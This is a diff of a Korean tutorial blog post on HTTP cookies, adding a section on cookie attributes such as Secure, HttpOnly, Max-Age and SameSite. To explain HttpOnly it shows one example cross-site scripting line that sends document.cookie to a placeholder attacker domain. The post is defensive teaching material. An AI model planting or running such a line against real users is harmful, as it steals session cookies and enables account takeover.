@@ -16,7 +16,7 @@ thumbnail: './images/cookie/thumbnail.png'
 쿠키도 HTTP헤더를 기반으로 구현됐습니다. 서버에서 다음과 같은 응답 헤더를 통해 날짜와 시간을 클라이언트에 저장해달라고 요청할 수 있습니다.
 
 ```js
-    Set-Cookie: DATE=March/4/2020
+Set-Cookie: DATE=March/4/2020
 ```
 
 `이름=값` 형식으로 요청하며, 클라이언트 에서는 이 값을 저장합니다. 이런 방법을 통해 서버에서 사이트의 첫 방문 여부 등을 판단할 수 있습니다.
@@ -24,11 +24,54 @@ thumbnail: './images/cookie/thumbnail.png'
 브라우저에서도 쿠키를 읽거나 설정할 수 있습니다.
 
 ```js
-    console.log(document.cookie)
-    --
-    [트위터 사이트에서의 실험 결과]
-    guest_id=v1%3A1...; _ga=GA1.2...
+console.log(document.cookie)
+--
+[트위터 사이트에서의 실험 결과]
+guest_id=v1%3A1...; _ga=GA1.2...
 ```
+
+### 쿠키의 속성
+
+쿠키는 `<cookie-name>=<cookie-value>` 과 같은 형식으로 지정 되는데, `cookie-name` 는 제어 문자 및 공백, 탭을 제외한 아스키 문자로 구성되어야 하며 특수기호를 포함 할 수 없습니다.
+
+- **__Secure-**: `__Secure-` 로 시작되는 쿠키 이름은 반드시 `secure` 플래그가 설정되어야 하고, HTTPS페이지여야 합니다.
+- **__Host-**: `__Host-` 로 시작되는 쿠키역시 secure 플래그가 설정되어야 하며, HTTPS 페이지여야 하고, 도메인이 지정되지 않아야 합니다. (따라서 서브 도메인에 쿠키를 공유할 수 없습니다) 그리고, 경로는 반드시 "/"여야 합니다.
+
+아래는 여러가지 Optinal한 쿠키 속성입니다.
+
+**Expires=<date>**
+
+쿠키의 최대 생존 시간입니다. 지정되지 않았다면, **세션 쿠키**로서 취급되며, 클라이언트가 종료될 때 파기 됩니다. 서버가 아니라 클라이언트에 상대적인 값으로 취급됩니다.
+
+**Max-Age=<number>**
+
+쿠키가 만료될 때 까지의 시간을 초단위로 표현합니다. 0 또는 음수가 지정되면 해당 쿠키는 즉시 만료되며, IE6,7,8은 이 헤더를 지원하지 않습니다. `Expires` 와 `Max-Age` 값이 모두 지정될 경우 Max-Age값을 더 우선적으로 판단합니다.
+
+**Domain=<domain-value>**
+
+Domain은 쿠키의 스코프를 정의하며 어느 사이트에서 생성한 것인지 알려줍니다. 지정되지 않으면 현재 페이지 URL을 기준으로 적용됩니다.
+
+**Path=<path-value>**
+
+쿠키를 보내기 전 요청 된 리소스에 있어야 하는 URL 경로를 나타냅니다. 예를 들어 `path=/soso` 로 지정된 경우 `/soso`, `/soso/jbee` 등의 경로에서 쿠키가 전송될 수 있습니다.
+
+**Secure**
+
+이 옵션이 설정된 쿠키들은 서버에서 SSL을 사용하며 HTTPS프로토콜을 사용할때만 전송됩니다.
+
+**HttpOnly**
+
+사용자의 쿠키를 보호하기 위해 설정하는 옵션입니다.
+
+예를 들어, 해커는 다음과 같은 코드를 통해 사용자의 쿠키를 가로챌 수 있습니다.
+
+```js
+location.href = 'https://😈.com?cookies=' + document.cookie
+```
+
+게시판이나 메일을 통해 이런 코드를 담은 게시물을 올리고, 사용자가 클릭한 경우 사용자의 쿠키는 모두 😈사이트로 전송됩니다.
+
+이러한 CSS(Cross-Site Scripting)공격을 방어하기 위해 document.cookie를 이용해 쿠키에 접근할 수 없도록 하는 옵션입니다.
 
 ### 주의사항
 
@@ -96,7 +139,7 @@ SameSite 속성으로 전달할 수 있는 값은 Strict, Lax, None값이 있습
 
 위 예시에서 쿠키는 다음과 같이 설정됩니다.
 
-```js
+```
 Set-Cookie: test=1; SameSite=Lax
 ```
 
@@ -104,7 +147,7 @@ Set-Cookie: test=1; SameSite=Lax
 
 Chrome은 80버전부터 기본 값을 `SameSite=Lax` 로 변경했습니다. 만약 `SameSite=None` 옵션으로 쿠키를 다루고 싶다면 Secure옵션을 추가해주어야 합니다.
 
-```js
+```
 Set-cookie: 3pcookie=value; SameSite=None; Secure
 ```
 
